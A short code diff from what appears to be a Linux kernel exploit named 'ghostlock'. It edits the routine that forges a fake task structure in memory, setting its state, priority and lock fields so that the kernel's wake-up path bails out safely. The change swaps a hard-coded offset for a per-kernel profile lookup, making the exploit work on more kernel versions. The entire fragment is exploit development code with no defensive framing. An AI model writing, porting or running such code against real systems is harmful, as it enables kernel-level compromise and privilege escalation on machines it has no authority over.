@@ -445,8 +445,9 @@ namespace ghostlock::support {
 
             put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
             /* TASK_RUNNING on the forged task: wake_up_state() bails out at
-             * the try_to_wake_up() state check (6.1 layout, state@0x30). */
-            put32(p, fake_task_off + kernel::FAKE_TASK_STATE_OFF, 0);
+             * the try_to_wake_up() state check before touching sched_class.
+             * Offset comes from the profile (task.state); fallback 0x10. */
+            put32(p, fake_task_off + ghostlock::profile::fake_task_state_off(), 0);
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
